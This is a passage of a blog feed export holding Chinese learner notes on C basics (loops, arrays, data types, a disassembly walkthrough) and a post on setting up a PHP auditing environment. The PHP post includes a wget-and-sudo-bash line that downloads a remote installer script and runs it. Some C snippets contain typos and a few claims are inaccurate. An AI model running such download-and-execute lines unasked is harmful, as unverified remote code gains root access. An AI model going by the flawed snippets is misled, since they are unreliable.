class="keyword">int</span> n)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">if</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">n--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello the %d world\n"</span>, n);</span><br><span class="line"><span class="keyword">return</span> func1(n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"end"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><p>数组的内容必须是同一类型的，通过下标来索引</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,n[<span class="number">4</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n[<span class="number">3</span>][<span class="number">3</span>]=&#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,n[<span class="number">2</span>][<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>.n[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础03–宏-amp-函数-amp-数组&quot;&gt;&lt;a href=&quot;#C语言基础03–宏-amp-函数-amp-数组&quot; class=&quot;headerlink&quot; title=&quot;C语言基础03–宏&amp;amp;函数&amp;amp;数组&quot;&gt;&lt;/a&gt;C语言基础03–宏&amp;amp;函数&amp;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础02--条件语句</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8002--%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8002--%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/</id>
    <published>2020-05-15T07:40:50.000Z</published>
    <updated>2020-05-16T16:52:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础02–条件语句"><a href="#C语言基础02–条件语句" class="headerlink" title="C语言基础02–条件语句"></a>C语言基础02–条件语句</h1><h3 id="goto语句"><a href="#goto语句" class="headerlink" title="goto语句"></a>goto语句</h3><p>类似于汇编中的JMP,尽量不要用goto，实在没办法再用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">goto</span> loop;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">loop:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="if-else语句"><a href="#if-else语句" class="headerlink" title="if-else语句"></a>if-else语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="comment">//条件为true，执行这里</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//反之，执行这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cmp</span></span><br><span class="line">    <span class="comment">//jnz</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n1=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">switch</span>(n1)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"1"</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"2"</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"?"</span>);<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//cmp</span></span><br><span class="line">    <span class="comment">//jz</span></span><br><span class="line">    <span class="comment">//cmp</span></span><br><span class="line">    <span class="comment">//jz</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">while</span>(n&gt;<span class="number">1</span>)&#123;<span class="comment">//满足条件就开始循环</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">        n--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// mov</span></span><br><span class="line">    <span class="comment">// cmp</span></span><br><span class="line">    <span class="comment">// call</span></span><br><span class="line">    <span class="comment">// dec</span></span><br><span class="line">    <span class="comment">// jmp</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do-while语句"><a href="#do-while语句" class="headerlink" title="do-while语句"></a>do-while语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;<span class="comment">//先执行一遍</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">        n++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(n&lt;<span class="number">100</span>);<span class="comment">//再判断条件进行循环</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mov</span></span><br><span class="line"><span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="comment">// cmp</span></span><br><span class="line"><span class="comment">// jz</span></span><br></pre></td></tr></table></figure><h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;<span class="comment">//类似while，但是把定义判断循环整合在一起了，类似于while的简写</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mov</span></span><br><span class="line"><span class="comment">// cmp</span></span><br><span class="line"><span class="comment">// jz</span></span><br><span class="line"><span class="comment">// call</span></span><br><span class="line"><span class="comment">// jmp</span></span><br><span class="line"><span class="comment">// inc</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础02–条件语句&quot;&gt;&lt;a href=&quot;#C语言基础02–条件语句&quot; class=&quot;headerlink&quot; title=&quot;C语言基础02–条件语句&quot;&gt;&lt;/a&gt;C语言基础02–条件语句&lt;/h1&gt;&lt;h3 id=&quot;goto语句&quot;&gt;&lt;a href=&quot;#goto语句&quot;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP代码调试环境搭建</title>
    <link href="http://kn0sky.com/wiki/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/PHP%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://kn0sky.com/wiki/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/PHP%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-05-15T06:40:50.000Z</published>
    <updated>2020-05-28T08:50:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-代码调试环境搭建"><a href="#PHP-代码调试环境搭建" class="headerlink" title="PHP 代码调试环境搭建"></a>PHP 代码调试环境搭建</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文以记录个人进行人工代码审计学习所使用到的PHP相关的环境的搭建，后面打算开始更新代码审计学习相关文章，有兴趣的老哥可以来关注一下~</p><p>本文将简要介绍PHP运行环境的搭建（包括Windows和Linux）</p><p>以及主要介绍一下<strong>PHP断点调试环境的搭建</strong></p><h3 id="PHP-运行环境的搭建"><a href="#PHP-运行环境的搭建" class="headerlink" title="PHP 运行环境的搭建"></a>PHP 运行环境的搭建</h3><p>现在有一键搭建php运行环境的工具在，所以这里搭建操作很简单，此处简单记录搭建过程</p><h4 id="Windows系统下"><a href="#Windows系统下" class="headerlink" title="Windows系统下"></a>Windows系统下</h4><p>Windows环境我使用的是Windows7版本的虚拟机，创建好虚拟机之后去<code>PHPStudy</code>官网下载Windows安装包，拖到Windows虚拟机里，然后直接安装即可，非常无脑</p><p><img src="image-20200527223443701.png" alt="image-20200527223443701"></p><h4 id="Linux系统下"><a href="#Linux系统下" class="headerlink" title="Linux系统下"></a>Linux系统下</h4><p>Linux环境我使用的是Ubuntu 20.04 LTS版本的虚拟机，创建好虚拟机之后去<code>PHPStudy</code>官网寻找Ubuntu的安装脚本,这里我找好了，如下，直接复制进装好的Ubuntu虚拟机里执行即可，也很无脑</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh https://download.xp.cn/install.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></table></figure><p>安装完会出现如下字样</p><p><img src="image-20200528164930223.png" alt="image-20200528164930223"></p><p>至于如何使用，可以在官网上的文档找到详细说明</p><hr><h3 id="PHP-断点调试环境的搭建"><a href="#PHP-断点调试环境的搭建" class="headerlink" title="PHP 断点调试环境的搭建"></a>PHP 断点调试环境的搭建</h3><p>本文主要</p><h4 id="Windows系统下-1"><a href="#Windows系统下-1" class="headerlink" title="Windows系统下"></a>Windows系统下</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PHP-代码调试环境搭建&quot;&gt;&lt;a href=&quot;#PHP-代码调试环境搭建&quot; class=&quot;headerlink&quot; title=&quot;PHP 代码调试环境搭建&quot;&gt;&lt;/a&gt;PHP 代码调试环境搭建&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="审计笔记" scheme="http://kn0sky.com/categories/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础01--初见C语言</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81C%E8%AF%AD%E8%A8%80/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81C%E8%AF%AD%E8%A8%80/</id>
    <published>2020-05-15T06:40:50.000Z</published>
    <updated>2020-05-16T16:52:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础01–初见C语言"><a href="#C语言基础01–初见C语言" class="headerlink" title="C语言基础01–初见C语言"></a>C语言基础01–初见C语言</h1><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><p>默认情况下，main函数是C语言的起点</p><p>printf()函数是格式化输出函数  （来自stdio.h）</p><p>单行注释：/    单行内容   /</p><p>多行注释：/*  多行内容 */</p><h3 id="使用VS2015创建项目"><a href="#使用VS2015创建项目" class="headerlink" title="使用VS2015创建项目"></a>使用VS2015创建项目</h3><ol><li>新建项目</li><li>依次选择vc++ ，win32   ，win32控制台程序</li><li>随便写个项目名称</li><li>应用程序向导里选择空项目，其他默认</li><li>从源文件添加新建项，创建.c文件</li><li>开始写代码</li></ol><h3 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>vs2015反汇编代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">;前面这块用于保障程序稳定性，把栈抬高，然后可以随便弄，弄完再把栈还原，再把寄存器的值还原</span><br><span class="line">;将ebp存起来，然后把栈抬高0C0H位</span><br><span class="line">00C41760  push        ebp  </span><br><span class="line">00C41761  mov         ebp,esp  </span><br><span class="line">00C41763  sub         esp,0C0h</span><br><span class="line"></span><br><span class="line">;把ebx，esi，edi入栈</span><br><span class="line">00C41769  push        ebx  </span><br><span class="line">00C4176A  push        esi  </span><br><span class="line">00C4176B  push        edi</span><br><span class="line"></span><br><span class="line">;把栈抬高的位置放到edi，然后从edi刷CCCCCCCCh</span><br><span class="line">00C4176C  lea         edi,[ebp-0C0h]  </span><br><span class="line">00C41772  mov         ecx,30h  </span><br><span class="line">00C41777  mov         eax,0CCCCCCCCh  </span><br><span class="line">00C4177C  rep stos    dword ptr es:[edi]  </span><br><span class="line"></span><br><span class="line">;这里是直接把字符串push进去，然后调用printf，然后平栈</span><br><span class="line">printf(&quot;hello world!\n&quot;);</span><br><span class="line">00C4177E  push        offset string &quot;hello world!\n&quot; (0C46BD0h) </span><br><span class="line">00C41783  call        _printf (0C41316h)  </span><br><span class="line">00C41788  add         esp,4  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">;等价于eax清零，比mov eax ,0效率高</span><br><span class="line">00C4178B  xor         eax,eax  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;把edi,esi,ebx取出来</span><br><span class="line">00C4178D  pop         edi  </span><br><span class="line">00C4178E  pop         esi  </span><br><span class="line">00C4178F  pop         ebx</span><br><span class="line"></span><br><span class="line">;把栈放回去</span><br><span class="line">00C41790  add         esp,0C0h  </span><br><span class="line"></span><br><span class="line">;比较一下栈是否还在原来的位置</span><br><span class="line">00C41796  cmp         ebp,esp  </span><br><span class="line">00C41798  call        __RTC_CheckEsp (0C4110Eh)  </span><br><span class="line">;还原esp和ebp</span><br><span class="line">00C4179D  mov         esp,ebp  </span><br><span class="line">00C4179F  pop         ebp  </span><br><span class="line">;函数执行结束</span><br><span class="line">00C417A0  ret</span><br></pre></td></tr></table></figure><p>先把栈抬高，清空，用完再还原，可以实现不影响以前的栈</p><h3 id="C语言关键字"><a href="#C语言关键字" class="headerlink" title="C语言关键字"></a>C语言关键字</h3><p><img src="image-20200515130659045.png" alt="image-20200515130659045"></p><h3 id="C语言保留标识符"><a href="#C语言保留标识符" class="headerlink" title="C语言保留标识符"></a>C语言保留标识符</h3><ol><li>下划线开始的标识符</li><li>标准库函数名</li></ol><h3 id="C语言数据类型"><a href="#C语言数据类型" class="headerlink" title="C语言数据类型"></a>C语言数据类型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="comment">//C99之前没有布尔类型，要用需要通过typedef的方式自己构造</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//int家族</span></span><br><span class="line">    short num0;<span class="comment">//2字节</span></span><br><span class="line">    <span class="keyword">int</span>  num1;<span class="comment">//4字节</span></span><br><span class="line">    <span class="keyword">long</span>  num2;<span class="comment">//8字节，大部分情况下 long = int 都是4字节</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> num3;</span><br><span class="line">    <span class="keyword">unsigned</span> short num4;<span class="comment">// 无符号短整型</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>   num5;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  num6;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//字符</span></span><br><span class="line">    <span class="keyword">char</span> ctmp = <span class="string">'A'</span>; <span class="comment">//此处需要用单引号，双引号是字符串</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//浮点型，存小数，也支持科学技术法</span></span><br><span class="line">    <span class="keyword">float</span> f1;<span class="comment">//32位</span></span><br><span class="line">    <span class="keyword">double</span> f2;<span class="comment">//64位</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">double</span> f3;<span class="comment">//128位</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//bool</span></span><br><span class="line">    <span class="keyword">bool</span> ff = <span class="literal">true</span>;<span class="comment">//1</span></span><br><span class="line">    <span class="keyword">bool</span> ft = <span class="literal">false</span>;<span class="comment">//0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//指针</span></span><br><span class="line">    <span class="keyword">char</span> * pch;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//union联合体</span></span><br><span class="line">    <span class="comment">//struct结构体</span></span><br><span class="line">    <span class="comment">//enum枚举</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C语言输入输出函数"><a href="#C语言输入输出函数" class="headerlink" title="C语言输入输出函数"></a>C语言输入输出函数</h3><p>输入函数：scanf(“%?”,temp);</p><p>输出函数：printf(“%?”,temp);</p><h5 id="示例：输入输出字符串"><a href="#示例：输入输出字符串" class="headerlink" title="示例：输入输出字符串"></a>示例：输入输出字符串</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> str1[<span class="number">20</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, str1);</span><br><span class="line">len = <span class="built_in">strlen</span>(str1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world:%s,long:%d"</span>,str1,len);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认情况下scanf被禁用了，因为存在安全问题，需要包含一个宏才能用：</p><ol><li>项目–属性–C/C++–预处理器–编辑</li><li>把报错里说的宏复制进去</li></ol><h3 id="C语言命名规则"><a href="#C语言命名规则" class="headerlink" title="C语言命名规则"></a>C语言命名规则</h3><ul><li><p>由字母，数字，下划线组成</p></li><li><p>只能以字符和下划线开头，不能用数字开头</p></li><li><p>匈牙利命名法：变量名前+属性+类型</p></li><li><p>下划线划分</p></li><li><p>大驼峰命名：所有单词首字母大写</p></li><li><p>小驼峰命名：第一个单词首字母小写，其他首字母大写</p></li></ul><h3 id="C语言运算符"><a href="#C语言运算符" class="headerlink" title="C语言运算符"></a>C语言运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p><img src="image-20200515140054237.png" alt="image-20200515140054237"></p><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><p><img src="image-20200515140505452.png" alt="image-20200515140505452"></p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p><img src="image-20200515140907257.png" alt="image-20200515140907257"></p><h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><p><img src="image-20200515141019708.png" alt="image-20200515141019708"></p><h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p><img src="image-20200515141156271.png" alt="image-20200515141156271"></p><h4 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h4><p><img src="image-20200515141442250.png" alt="image-20200515141442250"></p><h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h4><p><a href="https://baike.baidu.com/item/运算符优先级/4752611#3" 